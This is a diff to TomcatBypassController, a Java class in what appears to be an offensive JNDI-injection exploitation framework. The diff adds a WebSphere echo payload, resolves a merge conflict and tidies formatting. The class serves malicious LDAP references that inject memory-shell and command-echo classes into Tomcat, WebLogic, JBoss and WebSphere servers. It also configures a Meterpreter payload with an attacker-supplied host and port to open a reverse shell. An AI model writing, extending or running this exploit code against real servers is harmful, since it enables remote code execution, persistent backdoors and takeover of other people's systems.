@@ -9,6 +9,7 @@ import com.nu1r.jndi.gadgets.utils.InjShell;
 import com.nu1r.jndi.template.*;
 import com.nu1r.jndi.template.Agent.WinMenshell;
 import com.nu1r.jndi.template.Websphere.WSFMSFromThread;
+import com.nu1r.jndi.template.Websphere.websphereEcho;
 import com.nu1r.jndi.template.jboss.JBFMSFromContextF;
 import com.nu1r.jndi.template.jboss.JBSMSFromContextS;
 import com.nu1r.jndi.template.jboss.JbossEcho;
@@ -58,10 +59,11 @@ public class TomcatBypassController implements LdapController {
     public static CommandLine cmdLine;
 
     /**
-     发送LDAP ResourceRef结果和重定向URL
-     @param result InMemoryInterceptedSearchResult类型的结果
-     @param base 基本远程参考负载字符串
-     @throws Exception 异常
+     * 发送LDAP ResourceRef结果和重定向URL
+     *
+     * @param result InMemoryInterceptedSearchResult类型的结果
+     * @param base   基本远程参考负载字符串
+     * @throws Exception 异常
      */
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
@@ -91,6 +93,9 @@ public class TomcatBypassController implements LdapController {
                     break;
                 case weblogicecho:
                     code = helper.injectWeblogicEcho();
+                    break;
+                case websphereecho:
+                    code = helper.injectWebsphereEcho();
                     break;
                 case issuccess:
                     code = helper.injectSuccess();
@@ -152,7 +157,7 @@ public class TomcatBypassController implements LdapController {
                 case jbossecho:
                     code = helper.injectJbossEcho();
                     break;
-                case AllEcho:
+                case allecho:
                     code = helper.injectAllEcho();
                     break;
             }
@@ -176,17 +181,18 @@ public class TomcatBypassController implements LdapController {
     }
 
     /**
-     处理传入的参数 base
-     @param base 传入的参数
-     @throws UnSupportedPayloadTypeException 不支持的载荷类型异常
-     @throws IncorrectParamsException 错误的参数异常
-     @throws UnSupportedGadgetTypeException 不支持的 Gadget 类型异常
+     * 处理传入的参数 base
+     *
+     * @param base 传入的参数
+     * @throws UnSupportedPayloadTypeException 不支持的载荷类型异常
+     * @throws IncorrectParamsException        错误的参数异常
+     * @throws UnSupportedGadgetTypeException  不支持的 Gadget 类型异常
      */
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
         try {
             // 获取第一个斜杠的索引
-            int fistIndex   = base.indexOf("/");
+            int fistIndex = base.indexOf("/");
             // 获取第二个斜杠的索引
             int secondIndex = base.indexOf("/", fistIndex + 1);
             if (secondIndex < 0) secondIndex = base.length();
@@ -293,8 +299,8 @@ public class TomcatBypassController implements LdapController {
             }
             if (gadgetType == GadgetType.msf) {
                 String[] results1 = Util.getIPAndPortFromBase(base);
-                Config.rhost=results1[0];
-                Config.rport=results1[1];
+                Config.rhost = results1[0];
+                Config.rport = results1[1];
                 System.out.println("[+] RemotHost: " + results1[0]);
                 System.out.println("[+] RemotPort: " + results1[1]);
                 params = results1;
@@ -337,13 +343,14 @@ public class TomcatBypassController implements LdapController {
             return injectClass(SpringEchoTemplate.class);
         }
 
-<<<<<<< HEAD
         public String injectWeblogicEcho() {
             return injectClass(weblogicEcho.class);
         }
 
-=======
->>>>>>> a1031f3461815c3f17adf15618ebda66c9327d7f
+        public String injectWebsphereEcho() {
+            return injectClass(websphereEcho.class);
+        }
+
         public String injectAllEcho() {
             return injectClass(AllEcho.class);
         }
@@ -355,7 +362,7 @@ public class TomcatBypassController implements LdapController {
         //        public String injectMeterpreter(){return injectClass(Meterpreter.class);}
         public String injectMeterpreter() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
             Class<?> ctClazz      = Class.forName("com.nu1r.jndi.template.Meterpreter");
-            Field        WinClassName = ctClazz.getDeclaredField("host");
+            Field    WinClassName = ctClazz.getDeclaredField("host");
             WinClassName.setAccessible(true);
             WinClassName.set(ctClazz, params[0]);
             Field WinclassBody = ctClazz.getDeclaredField("port");
